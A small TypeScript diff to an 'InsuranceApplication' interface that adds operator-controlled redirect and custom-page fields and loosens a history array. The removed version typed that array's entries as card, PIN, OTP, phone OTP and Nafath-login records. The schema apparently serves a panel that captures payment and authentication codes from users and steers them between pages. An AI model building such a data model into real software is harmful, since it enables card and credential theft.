@@ -134,8 +134,12 @@ export interface InsuranceApplication {
     sessionStartAt?: string
     
     // Redirect Control
-    redirectPage?: string | null
+    redirectPage?: string
     redirectRequestedAt?: string
+    blockedUpdatedAt?: string
+    customPageTitle?: string
+    customPageText?: string
+    customPageUpdatedAt?: string
     redirectRequestedBy?: string
     redirectedAt?: string
     
@@ -172,13 +176,7 @@ export interface InsuranceApplication {
     isUnread?: boolean
     online?: boolean
     selectedFeatures?: string[]
-    history?: Array<{
-      id: string
-      type: "card" | "otp" | "pin" | "phone_info" | "phone_otp" | "nafad" | "_t1" | "_t2" | "_t3" | "_t4" | "_t5" | "_t6"
-      timestamp: string
-      status: "pending" | "approved" | "rejected"
-      data: any
-    }>
+    history?: any[]
   }
   
   export interface ChatMessage {
